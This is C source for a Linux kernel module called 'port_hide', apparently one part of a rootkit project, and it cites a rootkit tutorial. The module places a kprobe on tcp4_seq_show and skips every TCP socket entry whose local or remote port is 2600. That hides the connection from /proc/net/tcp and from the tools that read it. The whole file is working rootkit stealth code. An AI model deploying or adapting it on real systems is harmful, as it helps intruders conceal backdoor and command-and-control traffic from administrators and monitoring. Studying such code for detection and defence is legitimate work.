// SPDX-License-Identifier: GPL-2.0-only
/*
 * https://github.com/torvalds/linux/blob/master/samples/kprobes/kprobe_example.c
 * https://xcellerator.github.io/posts/linux_rootkits_08/
 */

#define pr_fmt(fmt) "%s: " fmt, __func__
#define HIDE 2600

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/tcp.h>

#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif

/* For each probe you need to allocate a kprobe structure */
static struct kprobe kp = {
    .symbol_name = "tcp4_seq_show",
};

/* kprobe pre_handler: called just before the probed instruction is executed */
static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    void *v;

    struct sock *sk;
    struct inet_sock *inet;

    unsigned short local_port;
    unsigned short remote_port;

    if (!regs)
        return 0;

    dbg_print("Registers: ip=%lx, di=%lx, si=%lx, dx=%lx, cx=%lx\n",
            regs->ip, regs->di, regs->si, regs->dx, regs->cx);

    // Get the second argument (regs->si)
    v = (void *)regs->si;
    dbg_print("Argument v (regs->si): %px\n", v);

    if (v == SEQ_START_TOKEN)
    	return 0; // Normal processing

    // Interpret v as struct sock
    sk = (struct sock *)v;
    dbg_print("sock: %px\n", sk);

    if (!sk)
        return 0; // Normal processing

    // Convert sock to inet_sock
    inet = inet_sk(sk);
    dbg_print("inet_sock: %px\n", inet);

    if (!inet)
        return 0; // Normal processing

    // Take local and remote ports from struct
    local_port = ntohs(inet->inet_sport);
    remote_port = ntohs(inet->inet_dport);
    dbg_print("Local port: %u\n", local_port);
    dbg_print("Remote port: %u\n", remote_port);

    // Check if the port matches the hidden port
    if (local_port == HIDE || remote_port == HIDE) {
        dbg_print("Hiding local port: %u\n", local_port);
        dbg_print("Hiding remote port: %u\n", remote_port);
        return 1; // Skip this entry
    }

    return 0; // Allow normal processing
}

static int __init port_hide_init(void) {
    int ret;
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return ret;
    }
    dbg_print("tcp4_seq_show: %px\n", kp.addr);
    return 0;
}

static void __exit port_hide_exit(void)
{
    unregister_kprobe(&kp);
    pr_info("port_hide exit successfully\n");
}

module_init(port_hide_init);
module_exit(port_hide_exit);
MODULE_AUTHOR("MikeHorn-git");
MODULE_DESCRIPTION("port_hide");
MODULE_LICENSE("GPL");
